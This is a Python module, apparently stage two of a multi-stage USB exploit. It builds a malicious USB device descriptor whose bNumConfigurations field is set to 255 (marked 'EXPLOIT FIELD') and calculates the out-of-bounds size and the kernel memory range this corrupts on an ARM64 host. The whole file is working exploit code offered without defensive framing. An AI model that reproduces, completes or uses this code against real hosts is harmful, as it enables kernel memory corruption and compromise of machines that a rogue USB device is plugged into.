#!/usr/bin/env python3
"""
Stage 2: Descriptor Corruption Module

Handles bNumConfigurations overflow after boot quirk.
"""

from dataclasses import dataclass
import struct


@dataclass
class Stage2Config:
    """Configuration for Stage 2"""
    original_bnum: int = 1
    malicious_bnum: int = 255
    config_struct_size: int = 272  # sizeof(usb_host_config) ARM64


class DescriptorOverflow:
    """Manages descriptor overflow for Stage 2"""

    def __init__(self, config: Stage2Config = None):
        self.config = config or Stage2Config()

    @property
    def oob_size(self) -> int:
        """Calculate out-of-bounds access size"""
        return (self.config.malicious_bnum - self.config.original_bnum) * self.config.config_struct_size

    def build_malicious_descriptor(self) -> bytes:
        """Build descriptor with inflated bNumConfigurations"""
        return struct.pack(
            '<BBHBBBBHHHBBBB',
            18, 0x01, 0x0200, 0, 0, 0, 64,
            0x041e, 0x3000,
            0x0100, 1, 2, 3,
            self.config.malicious_bnum  # EXPLOIT FIELD
        )

    def get_corruption_range(self, base_addr: int) -> tuple:
        """Get memory range that will be corrupted"""
        allocated = self.config.original_bnum * self.config.config_struct_size
        accessed = self.config.malicious_bnum * self.config.config_struct_size

        return (
            base_addr + allocated,  # Start of OOB
            base_addr + accessed    # End of OOB
        )
